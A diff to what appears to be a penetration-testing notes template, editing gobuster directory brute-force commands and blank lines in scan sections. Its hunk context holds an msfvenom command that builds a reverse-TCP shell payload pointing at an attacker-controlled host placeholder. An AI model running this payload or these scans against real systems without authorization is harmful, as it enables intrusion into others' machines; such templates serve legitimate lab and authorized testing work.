@@ -10,11 +10,9 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=4444 -f elf -o s
 - Windows domain:
 
 ### Full TCP Scan
-
 INSERTFULLTCPSCAN
 
 ### Full UDP Scan
-
 INSERTUDPSCAN
 
 ### Vuln Scan
@@ -320,10 +318,10 @@ View Source
 Step 2: 
 Start Secondary Scans
 ```
-Common files and extensions
-gobuster -u http://INSERTIPADDRESS -e -n -w /usr/share/wordlists/dirb/common.txt -t 100 -x .php,.asp,.html,.pl
+Common directories and extensions
+gobuster -u http://INSERTIPADDRESS -e -n -w /usr/share/wordlists/dirb/common.txt -t 100 -x .php,.asp,.html,.pl,.js,.py,.aspx,.htm,.xhtml
 
-Most files and extension
+Most directories and extension
 gobuster -u http://INSERTIPADDRESS -e -n -f -w /usr/share/wordlists/dirb/big.txt -t 100 -x .asp,.aspx,.bat,.c,.cfm,.cgi,.com,.dll,.exe,.htm,.html,.inc,.jhtml,.jsa,.jsp,.log,.mdb,.nsf,.php,.phtml,.pl,.reg,.sh,.shtml,.sql,.txt,.xml
 
 wig-git -t 50 -q -d http://INSERTIPADDRESS/path
